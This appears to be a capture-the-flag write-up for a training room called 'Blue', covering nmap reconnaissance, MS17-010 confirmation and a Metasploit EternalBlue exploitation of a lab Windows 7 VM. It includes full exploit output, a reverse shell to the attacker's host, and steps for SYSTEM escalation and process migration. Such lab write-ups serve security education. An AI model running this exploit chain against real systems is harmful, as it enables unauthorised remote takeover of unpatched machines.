
# Blue - Deploy & hack into a Windows machine, leveraging common misconfigurations issues.

## [Task 1] Recon 19/03/2019


### Description

Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

Link to Ice, the sequel to Blue: Link

You can check out the third box in this series, Blaster, here: Link

The virtual machine used in this room (Blue) can be downloaded for offline usage from https://darkstar7471.com/resources.html

Enjoy the room! For future rooms and write-ups, follow @darkstar7471 on Twitter.


### #1.1

Scan the machine. (If you are unsure how to tackle this, I recommend checking out the room RP: Nmap)

~~~
$ sudo nmap -sV -sS -p- 10.10.130.234
[sudo] password for unknown: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-30 19:57 CEST
Stats: 0:00:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 29.12% done; ETC: 20:00 (0:01:45 remaining)
Stats: 0:02:51 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 20:01 (0:00:32 remaining)
Stats: 0:02:54 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 44.44% done; ETC: 20:01 (0:00:24 remaining)
Nmap scan report for 10.10.130.234
Host is up (0.073s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 215.47 seconds
~~~

### #1.2

How many ports are open with a port number under 1000?
~~~
3
~~~

### #1.3

What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
Hint: Revealed by the ShadowBrokers, exploits an issue within SMBv1
~~~
ms17-010
~~~

You can confirm it with the following nmap script: https://svn.nmap.org/nmap/scripts/smb-vuln-ms17-010.nse
~~~
$ nmap -p 445 --script smb-vuln-ms17-010 10.10.130.234
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-30 20:10 CEST
Nmap scan report for 10.10.130.234
Host is up (0.075s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds
~~~

## [Task 2] Gain Access 19/03/2019


### Description

Exploit the machine and gain a foothold.

### #2.1

Start Metasploit

~~~
msfconsole
~~~

### #2.2

Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

First search for `ms17-010`:

~~~
msf5 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
~~~

We'll run this exploit: `exploit/windows/smb/ms17_010_eternalblue`

### #2.3

Show options and set the one required value. What is the name of this value? (All caps for submission)

~~~
msf5 > use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
~~~

Required option: `RHOST`

~~~
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.10.130.234
RHOST => 10.10.130.234
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options 

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.130.234    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
~~~

### #2.4

Run the exploit!

~~~
msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.9.35.106:4444 
[*] 10.10.130.234:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.130.234:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.130.234:445     - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.130.234:445 - Connecting to target for exploitation.
[+] 10.10.130.234:445 - Connection established for exploitation.
[+] 10.10.130.234:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.130.234:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.130.234:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.130.234:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.130.234:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.130.234:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.130.234:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.130.234:445 - Sending all but last fragment of exploit packet
[*] 10.10.130.234:445 - Starting non-paged pool grooming
[+] 10.10.130.234:445 - Sending SMBv2 buffers
[+] 10.10.130.234:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.130.234:445 - Sending final SMBv2 buffers.
[*] 10.10.130.234:445 - Sending last fragment of exploit packet!
[*] 10.10.130.234:445 - Receiving response from exploit packet
[+] 10.10.130.234:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.130.234:445 - Sending egg to corrupted connection.
[*] 10.10.130.234:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.9.35.106:4444 -> 10.10.130.234:49231) at 2020-04-30 11:46:47 -0700
[+] 10.10.130.234:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.130.234:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.130.234:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
~~~

Press `ENTER` for the DOS shell to appear

### #2.5

Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. 


## [Task 3] Escalate 19/03/2019


### Description

Escalate privileges, learn how to upgrade shells in metasploit.

### #3.1

If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 

### #3.2

Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)

### #3.3

Set the required option, you may need to list all of the sessions to find your target here. 

### #3.4

Run! If this doesn't work, try completing the exploit from the previous task once more.

### #3.5

Once the meterpreter shell conversion completes, select that session for use.

### #3.6

Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. 

### #3.7

List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

### #3.7

Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 



## [Task 4] Cracking 19/03/2019



## [Task 5] Find flags! 


